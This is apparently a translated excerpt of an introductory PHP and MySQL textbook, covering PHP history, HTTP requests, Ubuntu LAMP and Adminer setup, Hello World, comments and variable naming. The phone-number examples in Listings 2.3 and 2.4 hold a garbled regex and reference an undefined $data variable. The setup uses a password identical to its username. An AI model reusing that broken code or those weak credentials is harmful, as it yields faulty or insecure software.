# MySQL PHP Web开发：应用程序编程实用指南






























































































## 献词

**献给我的妻子黛比，** *她总是鼓励我追求美好，并“做下一件正确的事”。没有你的爱、支持和温柔的督促，我永远不会完成这个项目。*

**献给我的学生们，** *你们让我意识到，我在这里不是要教你们，而是要为你们的学习提供支持。*

## 前言

大约十年前，我在运营本地的 PHP 用户组，Ken 听说了我们的活动并参加了一次。他立刻成为我们社区中一位永远充满热情的成员。Ken 总是乐于向大家问好，确保每个人都能感到受欢迎。除此之外，他还总是很乐意做演讲，这无疑是赢得用户组组织者好感的最可靠方式。当我们需要新的会议场地时，Ken 再次挺身而出，主动提供他在当地技术学院授课的教室。那里非常合适，空间充足，交通便利，有投影仪，还有超棒的 Wi-Fi——用户组的梦想成真了！最终，Ken 犯了一个“错误”，他提到如果我们还需要什么，他不介意提供更多帮助。他的话刚说完，我就把他拉来做了用户组的联合组织者。

多年来，Ken 在建设我们出色的本地 PHP 社区方面做出了不可估量的贡献。他有一种富有感染力的热情，能够吸引人加入，而且他对教学的热爱无人能及。他不仅仅教授教材内容，还真心关心学生的成功。不仅如此，你总能信赖他。当他开始酝酿写一本书的想法时，Ken 不确定自己能否完成这本书，但我从未怀疑过他能做到。我知道，一旦他答应了某件事，他就会坚持下去并把它完成。这就是 Ken 的为人。

Ken 的教学风格侧重于现实世界的技能和实践操作。这本书也不例外。当你读完这本书时，你将拥有与数据库交互、与用户交互的可用代码示例。你会对这些交互过程中发生的事情有很好的理解，这将在你未来的调试工作中极大地帮助你，并为你学习更高级的编程技术、框架和库打下坚实的基础。

所以，尽管 Ken 和我对于你接下来应该具体学习哪个框架持有不同意见，但我非常感激他对 PHP 的热爱以及他与他人分享知识的热情。有了 Ken 在身边，我们的社区变得更好，我也非常期待你能通过这本书对他有更多了解。

欢迎来到 PHP 社区。我们很高兴你在这里！

– Beth Tucker Long，2021 年 7 月

## 关于作者

Ken Marks 在威斯康星州麦迪逊市的麦迪逊学院担任编程讲师，从事着他梦想中的工作，自 2012 年起教授使用 MySQL 的 PHP 网页开发。在从教之前，Ken 做了 20 多年的软件工程师，主要开发医疗设备软件。

Ken 在加州州立大学富勒顿分校获得计算机科学学士学位，并在威斯康星大学普拉特维尔分校获得成人教育理学硕士学位。

Ken 积极参与 PHP 社区活动，在会议上演讲和教学。

在业余时间，他兴趣广泛，比如 3D 打印、桌游开发、业余无线电、飞钓，当然还有咖啡烘焙 :-)

Ken 有两个已成年的女儿，目前与妻子以及他们的猫 Ophelia（这只猫以为自己是一条狗）住在麦迪逊地区。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_15_0.png)

## 引言

> *预测未来的最好方式就是创造未来。*
> 
> *- 艾伦·凯*

### 谁应该使用这本书？

你想学习如何创建动态的、由数据库驱动的 Web 应用程序吗？本书将指导你使用 PHP 和 MySQL 构建一个典型的 CRUD（创建-读取-更新-删除）应用程序。

### 入门级编程知识

如果你对编程概念有入门级的理解，那么这本书适合你。
你应该熟悉以下概念：

- 如何创建变量
- 以下几种逻辑：
  - 顺序
  - 条件
  - 循环
- 使用函数和对象方法进行模块化
- 数组

你应该熟悉以上所有概念，可以使用你所熟悉的任何一种现代编程语言。

### 基础的 HTML/CSS 知识

你应该对如何使用 HTML 和 CSS 创建简单的静态网页有基本了解。一个很好的复习这些技能的地方是 https://www.w3schools.com。

### 数据库和 SQL 的入门知识

虽然不是必需的，但了解关系数据库的工作原理，并对结构化查询语言（SQL）有一些入门知识会很有帮助。

## 引言

### 为什么选择 PHP 和 MySQL？

PHP 和 MySQL 都是开源的，这意味着你可以免费下载它们，如果你愿意，还可以修改源代码。此外，PHP 和 MySQL 经常一起使用。

PHP 和 MySQL 的入门门槛都很低。你只需要一台电脑，就可以开发带有数据库的动态 Web 应用程序。使用 PHP 和 MySQL 进行开发所需的所有应用程序都是免费的。

### 这本书不适合谁？

如果你对这些概念中的任何一个不熟悉，那么最好先找一本入门编程的书来读。虽然我们会介绍 PHP 如何实现常见的编程概念（如循环和数组），但我们希望你了解如何以及何时使用它们。同样，如果你对基本的 HTML/CSS 感到不熟练，你也应该花些时间复习这些技能。

### PHP 版本、MySQL 和本书

PHP 7.0 版本在性能和安全性方面都比 5.6 版本有了显著提升。因此，本书中介绍的所有 PHP 代码和概念都将基于 7.0 版本。

有许多数据库管理系统（DBMS）。然而，本书使用基于结构化查询语言（SQL）的 DBMS。我们使用 MySQL DBMS，因为它经常与 PHP 一起使用，免费下载和使用，并且它是世界上最流行的 DBMS。

### 代码示例的呈现方式

本书中通篇使用代码示例来阐述每个主题。较长的代码清单带有编号，并包含行号，便于引用。语法高亮（类似于现代文本编辑器或集成开发环境（IDE）中的）用于使变量、字符串和关键字更加突出，从而提高代码的可读性。最后，你也可以从 phparch.com 网站下载代码示例。

请记住，书中的代码示例经过格式化，以适应 PDF、电子阅读器屏幕以及印刷页面所提供的较窄宽度。为适应这一限制所做的任何修改都不影响代码的功能。因此，本书的代码存档也包括了此处应用程序代码的未修改版本。

### 如何使用这本书

本书分为两大部分。第一部分是 PHP 语言的基础参考。虽然它不是一个详尽的参考，但它解释了本书中介绍的 Web 应用程序所需的全部特性。随着更多 Web 应用程序的介绍，你将应用更多的 PHP 语言概念。第二部分通过介绍各种 Web 应用程序来展示如何应用 PHP 语言。它旨在让 Web 开发人员全面了解如何针对许多最常见的 Web 开发挑战应用 PHP 和 MySQL。为了说明这一过程，本书逐步完成了一个功能完整的应用程序的开发，该应用程序实现了其中典型的 CRUD（创建-读取-更新-删除）操作。

### PHP 简史

PHP 创建于 1994 年[1]，由 Rasmus Lerdorf 开发，最初设计为一套用 C 编程语言编写的简单通用网关接口（CGI）二进制程序，用于与 HTML 表单交互。Rasmus 将这套脚本称为“Personal Home Page Tools”。Rasmus 继续为他的工具集添加更多功能，包括数据库交互和用于开发动态 Web 应用程序的框架。1995 年 6 月初，Rasmus 通过 comp.infosystems.www.authoring.cgi 新闻组向公众发布了 PHP Tools。同年 10 月，Rasmus 发布了一个新版本，其中包含一个类似于 C 和 Perl 的高级脚本接口。次年 4 月，Rasmus 为多种 DBMS 添加了数据库支持，并于 1996 年 6 月发布了 PHP 2.0 版本。1998 年 5 月，1%（约 60000 台）的 Web 服务器安装了 PHP/FI。

1997 年，Andi Gutmans 和 Zeev Suraski 与 Rasmus 合作重写了 PHP 解析器。当他们（1998 年 6 月）发布 3.0 版本时，该编程语言被重新命名为“PHP”，这是一个递归缩写，意思是“PHP：超文本预处理器”。PHP 3 易于扩展，许多开发人员贡献了有用的模块。PHP 3 还为该语言添加了面向对象编程（OOP）扩展。PHP 3 曾一度被安装在互联网上 10% 的 Web 服务器上。

1998 年冬天，Andi Gutmans 和 Zeev Suraski 开始着手改进 PHP 解释器的性能和模块化。这次对 PHP 核心的重写后来被称为“Zend 引擎”（以 Zeev 和 Andi 的名字命名），并且

[1] PHP 创建于 1994 年：http://php.net/en/history.php




## 引言

于1999年中发布。PHP 4 于2000年5月正式发布，并增加了对更多 Web 服务器和会话管理的支持。

2004年7月，PHP 5 发布，其驱动核心为“Zend Engine 2.0”。此次发布包括对面向对象编程、PHP 数据对象（PDO - 定义与数据库的连接和交互）的改进以及其他功能。

2015年12月，PHP 开发团队发布了 PHP 7.0[2] 版本。此次发布将 PHP 应用的性能提升至比 5.6 版本快两倍左右。还包括多项安全增强和改进的异常处理。

PHP 8.0[3] 于2020年11月发布。它进一步增强了语言的类型提示系统并添加了命名参数，同时使语言更一致、性能更好。与之前的版本一样，核心贡献者努力将向后不兼容更改的影响降到最低，使得大多数代码库从 PHP 7 升级并非一项艰巨的任务。

### PHP 简史

- 1995年6月8日，PHP 1.0 发布到 usenet 群组 comp.infosystems.www.authoring.cgi
- 它由 Rasmus Lerdorf[4] 创建，名为 PHP Tools
- 然后 Rasmus 着手将他的工具与 Apache Web 服务器集成，不到一年后，PHP 2.0 发布到同一 Usenet 群组
- PHP 最初代表“Personal Home Pages。”
- PHP 现在代表“PHP Hypertext Preprocessor”（递归缩写）
- 它很可能是创建数据库驱动网站最快、最简单的工具
- 它可与任何 UNIX 系列上的 UNIX 基础 Web 服务器配合使用。该软件包完全免费，可用于所有用途，包括商业用途

当时 Rasmus 对 PHP 的描述如下：

> *PHP/FI 是一种服务器端嵌入 HTML 的脚本语言。它具有内置的访问日志和访问限制功能，还支持嵌入到 mSQL 和/或 Postgres95 后端数据库的 SQL 查询。*

[2] PHP 7.0：http://php.net/releases/7_0_0.php
[3] PHP 8.0：https://www.php.net/releases/8.0/en.php
[4] Rasmus Lerdorf：https://en.wikipedia.org/wiki/Rasmus_Lerdorf

## 第1章 PHP 脚本的生命周期

> 大多数优秀的程序员编程并不是因为期望获得报酬或公众的赞誉，而是因为编程很有趣。
> 
> - Linus Torvalds

## 1. PHP 脚本的生命周期

### 静态与动态网站

仅使用 HTML 只能创建静态网页。如果您只是想展示猫的图片，这种方法就足够了。然而，如果您想要一个能够与数据库交互并且网页可以根据可变内容更新的 Web 应用程序，则需要动态网站。这就是 PHP 发挥作用的地方。PHP 解释器在 Web 服务器中运行。PHP 会向 Web 服务器提供 HTML，并且由于 PHP 也是编程语言，它允许您动态构建 HTML。

### 浏览器与服务器

超文本传输协议（HTTP）是用于在 Web 服务器（我称之为服务器）和 Web 浏览器（我称之为客户端）之间通信的协议。

### HTTP 请求与响应

当您在计算机上打开 Web 浏览器并在地址栏中输入统一资源定位符（URL）（比如 flibbertigiblets.com）...

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_22_0.png)

一旦您按下计算机上的回车键，您的浏览器就会向 flibbertigiblets.com 的 Web 服务器发送 HTTP 请求。该请求可能类似于清单 1.1。

清单 1.1.

```
```
1. GET /phpWebDevMySQL/ HTTP/1.1
2. Host: flibbertigibets.com
3. Connection: keep-alive
4. Cache-Control: max-age=0
5. Authorization: Basic ZmFsbDIwMTdwaHA6dXNlIHRoZSBMb3Jj3jZQ==
6. Upgrade-Insecure-Requests: 1
7. User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6)
8. AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36
9. Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,
10. image/apng,*/*;q=0.8
11. Accept-Encoding: gzip, deflate
12. Accept-Language: en-US,en;q=0.9
13. If-Modified-Since: Mon, 13 Nov 2017 21:51:51 GMT
```
```

服务器可以向您的浏览器（客户端）发送各种响应。然而，最常见的是如下所示的 200 OK 响应：

```
HTTP/1.1 200 OK
Server: nginx/1.12.2
Date: Fri, 17 Nov 2017 00:31:35 GMT
Content-Type: text/html
Transfer-Encoding: chunked
Connection: keep-alive
Last-Modified: Mon, 13 Nov 2017 21:51:51 GMT
Content-Encoding: gzip
```

假设头部一切正常，服务器会向浏览器发送 HTML，因此您应该会看到图 1.2 所示的网页。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_23_0.png)

### 服务器与 PHP

如前所述，PHP 与 Web 服务器一起运行，负责解释 PHP 代码。

### PHP 解释器做什么

当 Web 服务器遇到 PHP 代码时，它会将代码交给 PHP 解释器。解释器根据 PHP 语言的规则执行代码。在代码中，文本经常需要回显或打印到网页上。此文本将从 PHP 解释器发送回 Web 服务器，以便作为 HTML 呈现回浏览器。

让我们看一个将 HTML 和 PHP 集成在一起并输出今天日期的简单网页：

```
<html>
  <head>
    <title>My Awesome Page</title>
  </head>
  <body>
    <h1>Today is <?php echo date("m-d-Y"); ?></h1>
  </body>
</html>
```

## 1. PHP 脚本的生命周期

当 Web 浏览器遇到 <?php 标签时，从开始的 <?php 到结束的 ?> 标签之间的所有内容都会交给 PHP 解释器进行处理。当 PHP 脚本处理完毕后，任何生成的 HTML 都会发送回 Web 服务器以输出给客户端。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_24_0.png)

上述脚本的输出如图所示 1.3。

### php.ini 文件与重要设置

php.ini 文件是我们设置和更改指令以配置 PHP 的地方。此文件在每次启动或重新启动 Web 服务器时都会被读取，并且是 PHP 初始化的方式。该文件对各种指令有很好的注释文档。访问 PHP 手册[1] 以详细了解 php.ini 指令。许多指令会影响应用程序的安全性和行为，因此请谨慎更改。

要找到 PHP 解释器使用的 php.ini 文件，您可以在浏览器中检查 phpinfo() 的输出，或在命令行中查看 php -i 的输出。

### 错误报告设置

在阅读本书时，您应该告诉 PHP 在浏览器中显示它遇到的任何错误。您将获得关于解析错误、未初始化变量等的反馈。否则，当您运行代码时，如果 PHP 遇到像缺少分号这样的语法错误，您可能会遇到令人恐惧的白屏死机（WSOD）。在您的 php.ini 文件中，检查以验证 display_errors 是否已启用：

```
display_errors = On;
```

在生产环境中，此设置应关闭以防止泄露敏感信息。

[1] PHP 手册：http://php.net/ini

## 第2章 编写您的第一个 PHP 脚本

> 我一直希望我的电脑像我的电话一样易于使用；我的愿望实现了，因为我现在再也搞不懂如何使用我的电话了。
> 
> - Bjarne Stroustrup

## 2. 编写您的第一个 PHP 脚本

### 设置开发环境

要编写 PHP，您只需要一个文本编辑器即可。然而，由于 PHP 与 Web 服务器一起运行，您需要访问 PHP 开发环境。我将向您展示如何安装和配置基于 Unix 的开发环境，用于编写和调试您的 PHP Web 应用程序。

### 下载 Unix 操作系统（OS）

由于大多数 PHP Web 应用程序运行在 Unix 操作系统的 Linux 发行版上，因此在其中开发是有意义的。我发现 Ubuntu Desktop 是最容易开发的操作系统之一。截至本文撰写时，当前版本为 Ubuntu 20.04.1 LTS。

> LTS 代表长期支持。Canonical 是维护 Ubuntu 的组织，保证对 LTS 版本提供五年的免费安全和维护更新。

我们需要做的第一件事是前往 https://www.ubuntu.com/download/desktop 并下载最新的 64 位 Ubuntu Desktop 版本，然后按图 2.1 所示的 Download 按钮。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_26_0.png)

图 2.1.





## 2. 编写你的第一个PHP脚本

接下来，在终端窗口中，以超级用户身份运行以下命令，使用 apt 安装包管理器升级所有应用程序：

```
sudo apt upgrade
```

你需要输入 Y 或按 Enter 键以接受更改。此更新可能需要几分钟时间，因为包管理器将升级自 Ubuntu 20.04.3 LTS 发布以来所有已更新的程序包（图 2.7、2.8 和 2.9）。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_28_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_28_1.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_28_2.png)

### 安装并测试 Apache

在终端窗口中，以超级用户身份运行以下命令，使用 apt 安装包管理器安装 Apache：

```
sudo apt install apache2
```

你需要输入 Y 或按 Enter 键以接受更改（图 2.10）。

为确保 Apache 正在运行，请在终端窗口中作为超级用户运行以下命令。你应该会看到如图 2.11 所示的输出。

```
sudo systemctl status apache2
```

按 q 键退出 systemctl status 命令。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_29_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_29_1.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_29_2.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_29_3.png)

## 2. 编写你的第一个PHP脚本

确保 Apache 正在运行的最佳方法是打开一个 Web 浏览器并导航到 localhost。如果你看到如图 2.12 所示的网页，则可以确信你的 Apache 安装正在运行。

### 安装并测试 MySQL

在终端窗口中，以超级用户身份运行以下命令，使用 apt 安装包管理器安装 MySQL 服务器和客户端。

```
sudo apt install mysql-server mysql-client
```

你需要输入 Y 或按 Enter 键以接受更改（图 2.13）。

为确保 MySQL 正在运行，请在终端窗口中作为超级用户运行以下命令。

```
sudo systemctl status mysql
```

启动输出如图 2.14 所示。

按 q 键退出 systemctl status 命令。

### 安装、配置并测试 PHP

在撰写本文时，Ubuntu 20.04.3 LTS 的默认 PHP 版本为 7.4。本书中的所有代码都应能在 PHP 7.2 或更高版本上良好运行。

在终端窗口中，以超级用户身份运行以下命令，使用 apt 安装包管理器安装 PHP 及受支持的模块：

```
sudo apt install php php-mysql php-curl php-json php-cgi libapache2-mod-php
```

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_30_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_30_1.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_30_2.png)

### 设置开发环境

你需要输入 Y 或按 Enter 键以接受更改（图 2.15）。

通过在终端窗口中运行以下命令来验证 PHP 是否已安装：

```
php -v
```

你应该会看到如图 2.16 所示的输出。

默认情况下，PHP 安装时关闭了错误报告。这个默认设置是件好事，因为我们不希望向潜在的黑客暴露我们已部署网站上文件的位置或漏洞。由于我们正在创建开发环境，我们需要在出现 PHP 错误时能够得知。

我们的大部分 PHP 配置设置都位于 php.ini 文件中。我们将使用 Ubuntu 自带的 nano 编辑器来修改此文件，以显示我们的错误。

在终端窗口中，输入以下命令来编辑 php.ini 文件：

```
sudo nano /etc/php/7.4/apache2/php.ini
```

你需要使用 nano 中的 ^W“Where Is”命令（ctrl+W）搜索第二次出现的 display_errors，并将其从 Off 改为 On（图 2.17）。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_31_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_31_1.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_31_2.png)

## 2. 编写你的第一个PHP脚本

然后使用 ^O（Ctrl 加大写字母 O）“Write Out”命令（ctrl+O）写出更改。接下来，按回车键确认要写出的文件名。最后，使用 ^X 退出命令（ctrl+X）退出 nano。参见图 2.18。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_32_0.png)

在终端窗口中，输入以下命令以重启 Apache，使这些更改生效：

```bash
sudo systemctl restart apache2
```

### 安装数据库管理工具 Adminer

接下来，我们要安装一个基于 Web 的数据库管理工具。市面上有几个这样的工具，最流行的是 phpMyAdmin[1]。不过，我喜欢使用一个名为 Adminer 的工具，因为它包含在单个 PHP 文件中，运行速度更快，并且以更高的安全性著称。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_32_1.png)

打开浏览器并导航到 Adminer 下载页面[2]。从那里，选择最新的适用于 MySQL 的 Adminer 版本，如图 2.19 所示。

这样做会将 Adminer PHP 文件下载到你的“下载”文件夹中。

接下来，我们需要将此文件重命名为 index.php，并将其复制到我们的 html/ 文件夹中，Apache 会从这个文件夹提供网页服务。我们的 html/ 文件夹的根目录位于 /var/www/html。最好的方法是使用终端窗口。

在终端窗口中，输入以下命令 cd 到 /var/www/html 目录：

```bash
cd /var/www/html
```

命令的输出如图 2.20 所示。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_32_2.png)

[1] phpMyAdmin：https://www.phpmyadmin.net/

[2] Adminer 下载页面：https://www.adminer.org/#download

由于 root 用户拥有 html/ 目录，我们需要使用超级用户权限在此移动 Adminer PHP 文件。让我们首先创建一个名为 adminer 的新文件夹，并通过在终端窗口中输入以下命令切换到该文件夹（输出如图 2.21 所示）：

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_33_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_33_1.png)

```
sudo mkdir adminer
cd adminer
```

现在，让我们以超级用户身份输入以下命令（图 2.22），将下载的 PHP 文件从我们的“下载”目录移动到 adminer 目录，并将其重命名为 index.php：

```
sudo mv ~/Downloads/adminer-4.7.7-mysql-en.php index.php
```

### 创建一个测试数据库用户和数据库

默认情况下，我们不能使用 root 账户访问 MySQL 数据库。这一默认设置是一个可靠的安全约束。为了让我们能够使用 Adminer——或者说 PHP——访问我们的数据库，我们需要以 root 身份使用 MySQL 命令行界面（CLI）工具来创建一个数据库用户账户，并为该用户授予对某个数据库的访问权限。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_33_2.png)

在终端窗口中，输入以下命令进入 MySQL CLI：

```
sudo mysql
```

然后，在出现提示时输入你的密码，如图 2.23 所示。

## 2. 编写你的第一个PHP脚本

现在，让我们在 MySQL CLI 中输入以下命令（图 2.24）来创建一个名为 testdb 的测试数据库：

```
CREATE DATABASE testdb;
```

接下来，我们需要为数据库创建一个带密码的用户，因此输入以下命令：

```
CREATE USER 'testuser'@'localhost' IDENTIFIED BY 'testuser';
```

该命令应该如图 2.25 所示。

最后，我们需要为我们的 testuser 授予对 testdb 数据库的所有权限。输入以下命令（图 2.26）：

```
GRANT ALL PRIVILEGES ON testdb.*
TO 'testuser'@'localhost';
```

作为标准做法，最好也刷新数据库的权限。参见图 2.27。

```
FLUSH PRIVILEGES;
```

输入 quit 退出 MySQL CLI（图 2.28）。

为确保 Adminer 正常运行，请打开浏览器并导航到 http://localhost/adminer/。在用户名处输入 testuser，密码输入你在 MySQL CLI 中创建 testuser 账户时选择的密码（testuser），然后按图 2.29 所示登录。

如果你看到如图 2.30 所示的网页，则说明 Adminer 正常工作，MySQL 也已正确安装并运行。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_34_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_34_1.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_34_2.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_34_3.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_34_4.png)




![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_35_0.png)

图 2.29.

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_35_1.png)

图 2.30.

### 你好，世界！

现在我们已经安装并配置了开发环境，可以编写第一个 PHP 程序了！首先，由于 root 用户是 /var/www/html 目录的所有者，请更改其上的组权限和访问权限，以便我们的用户可以在其中创建和修改文件。

在终端窗口中，导航到 /var/www 目录，并通过输入以下命令以超级用户身份更改 html 目录上的组权限和访问权限。确保将用户名更改为你自己的。

```
cd /var/www
sudo chgrp kmarks html/
sudo chmod 775 html/
```

当你执行长列表 (ls -al) 时，你应该会看到你的用户具有组和写权限，并且现在可以在 html/ 目录中创建文件（图 2.31）。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_35_2.png)

图 2.31.

现在让我们使用文件管理器应用程序（图 2.32）创建几个目录。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_35_3.png)

图 2.32.

## 2. 编写你的第一个 PHP 脚本

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_36_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_36_1.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_36_2.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_36_3.png)

在文件管理器应用程序中，选择左侧窗格中的 + 其他位置，然后在主窗格中选择计算机（图 2.33）。

导航到 /var/www/html 文件夹，并创建一个名为“php_development”的新文件夹，如图 2.34 和 2.35 所示。

为了保持整洁，我们将在 php_development/ 文件夹下为书中的每一章创建一个新文件夹，用于存放该章的练习。

在 php_development/ 文件夹中，创建另一个文件夹并将其命名为“chapter1。”

我将使用 Ubuntu 自带的 gedit[3] 编辑器（图 2.36）来编写代码。它是一个实用的编辑器，提供行号、缩进和语法高亮。

[3] gedit: https://wiki.gnome.org/Apps/Gedit

启动后，你会看到一个空白文档。以下是一些我喜欢为 gedit 编辑器设置的首选项。在文本编辑器窗口的汉堡菜单中，选择首选项菜单项，如图 2.37 所示。

在首选项对话框的视图选项卡下，选择显示行号和突出显示匹配括号，如图 2.38 所示。

在编辑器选项卡下，将制表符宽度更改为 4，选择插入空格而不是制表符，并启用自动缩进。参见图 2.39。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_37_0.png)

图 2.37.

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_37_1.png)

图 2.38.

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_37_2.png)

图 2.39.

## 2. 编写你的第一个 PHP 脚本

好了，最后我们可以编写第一个程序了！程序员之间有一个传统，我们在学习新语言时编写的第一个程序应该叫做 *Hello World*! 让我们遵循传统，创建一个“Hello World！”PHP 程序。

在你的 gedit 窗口中，输入列表 2.1 中显示的代码行。

### 列表 2.1.

```
1. <html>
2.   <head>
3.     <title>PHP-Hello World!</title>
4.   </head>
5.   <body>
6.   <?php
7.     echo "<h1>Hello World!</h1><br/>";
8.     date_default_timezone_set("America/Chicago");
9.     echo "<h2>Today is: " . date('l jS \of F Y h:i:s A') . "</h2><br/>";
10.  ?>
11.  </body>
12. </html>
```

输入此代码后，将文件保存为 chapter1/ 文件夹中的 hello_world.php（图 2.40）。

注意，将其保存为 .php 文件后，gedit 会像图 2.41 所示那样对代码进行语法高亮。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_38_0.png)

图 2.40.

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_38_1.png)

图 2.41.

打开你的网页浏览器并导航到 http://localhost/php_development/chapter1/。

你将看到 chapter1 目录中迄今为止的文件列表。你应该会看到类似图 2.42 的页面。

选择 hello_world.php。你应该会看到以下网页（图 2.43），显示美国中部时区（除非你为自己的时区更改了它）的今天日期和时间。

太棒了！你刚刚编写了你的第一个 PHP 程序！

### PHP 格式总览

PHP 需要遵守一些通用规则。

- 1. PHP 代码由 <?php 和 ?> 标签包围
- 2. 每个 PHP 语句必须以分号 ; 结尾
- 3. PHP 变量必须以美元符号 $ 开头

```
<?php
...
?>
```

```
echo 'Thanks for submitting the form.';
```

```
$email = $_POST['email'];
```

- - 变量名必须至少有一个字符长。
- - 美元符号 $ 后的第一个字符可以是字母或下划线 _，其后的字符可以是字母、下划线或数字。
- - 变量名中不允许出现空格和除开头 $ 和 _ 之外的特殊字符。

> 如果你忘记了开头的 PHP 标签，你将在浏览器中看到原始代码显示。出于篇幅考虑，本书中的许多代码示例省略了开始和结束标签。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_39_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_39_1.png)

## 2. 编写你的第一个 PHP 脚本

### 注释

当我们编写代码时，都是有原因的。我们经常需要分享某些东西之所以这样工作的原因。像许多现代编程语言一样，PHP 允许你创建单行和多行注释，如列表 2.2 所示。

### 列表 2.2.

```
```php
<?php
//Single line comment

### Also a single line comment

phpinfo(); //comment after code

/*
Multi line block, you can add as many
lines as you want, but don't write a book
*/
```
```

当我们对代码进行注释时，注释应反映代码存在的原因，而不是代码的工作方式。代码的工作方式通常由实际代码解释。

以下是一些不良和良好的注释示例。

### 不良注释示例

在列表 2.3 中，注释重复了代码的工作方式，而不是解释为什么要这样做。如果我们的正则表达式发生变化，我们必须记住更新注释——这一步经常被忽略。如果注释与代码不匹配，未来的开发人员可能会感到困惑。

### 列表 2.3.

```
```php
<?php
/*
We are formatting phone numbers by stripping all characters
then putting parens around the first 3 numbers adding a
space then grouping the next 3 numbers adding a dash
then the last 4 numbers
*/
function formatPhoneNumber($phone_string)
{
```
```
10. if (preg_match('/^\+d\{d\{3}\}(\d\{3\})(\d\{4\})$/', $data, $matches))
11. {
12. $result = "($matches[1]) $matches[2]-$matches[3]";
13. return $result;
14. }
15. }

### 良好注释示例

现在在列表 2.4 中，注释清楚地描述了电话号码的预期格式，并将实现细节留给代码。

### 列表 2.4.

```
1. <?php
2. /*
3. The business has a requirement that all phone numbers be
4. formatted with the (123) 123-1234 format
5. */
6. function formatPhoneNumber($phone_string)
7. {
8. if (preg_match('/^\+d\{d\{3}\}(\d\{3\})(\d\{4\})$/', $data, $matches))
9. {
10. $result = "($matches[1]) $matches[2]-$matches[3]";
11. return $result;
12. }
13. }
```

### 练习

- 1. 安装 LAMP（Linux Apache MySQL & PHP）堆栈。
- 2. 创建一个 hello_world.php 脚本并验证其运行。

## 第 3 章

## 为什么变量很重要

> “始终像这样编码：最终维护你代码的人会是一个知道你住在哪里的暴力精神病患者。”
> 
> – Martin Golding

## 3. 为什么变量很重要

### PHP 中的变量

PHP 支持几种类型的变量。预定义变量已由 PHP 语言定义，而用户定义变量则由你、开发者在代码中定义。然后还有表单变量，由 HTML 表单中的 name 属性定义，并成为预定义变量中的键。

### 有效的变量名

- - PHP 变量名必须以美元符号 ($) 开头。
- - 变量名必须至少有一个字符长。
- - 美元符号 $ 后的第一个字符可以是字母或下划线 _，其后的字符可以是字母、下划线或数字。
- - 变量名中不允许出现空格和除 _ 和 $ 之外的特殊字符。

以下是一些有效变量名的示例：

```
$name1
$price_tag
$_abc
$Abc_22
$A23
```

以下是一些无效变量名的示例：

```
$10names
box.front
$name#last
A-23
$5
```

### 命名变量的建议

PHP 确实有一套编码标准，本书遵循这些标准。你可以在 PHP-FIG 网站上找到它们，分别是 PSR-1：基本编码标准[1] 和 PSR-2：编码风格指南[2]。然而，编码标准有意对如何命名变量提供了很少的指导。标准建议对方法命名使用 camelCase，对类名使用 StudlyCaps，并对常量命名使用下划线分隔的 ALL_CAPS[3]。

[1] PSR-1：基本编码标准： http://www.php-fig.org/psr/psr-1/
[2] PSR-2：编码风格指南： http://www.php-fig.org/psr/psr-2/
[3] 命名常量： http://www.php-fig.org/psr/psr-1/#1-overview




我喜欢在 PHP 中创建变量、函数、方法、常量和类时使用以下约定，我将在整本书中使用这些约定：

| 属性 | 示例 |
|---|---|
| 变量名称 | $snake_case |
| 函数/方法名称 | function camelCase() |
| 类 | class StudlyCaps |
| 常量 | const ALL_CAPS |

关于命名你的变量，一个推荐的做法是为变量选择好的描述性名称（例如，$temperature_fahrenheit）。此外，大多数预定义的 PHP 变量以 $_ 开头（即 $_POST[]）。我建议你不要创建以下划线（_）开头的变量，因为这可能会让必须维护你代码的其他 PHP 开发者感到困惑。

### 变量类型

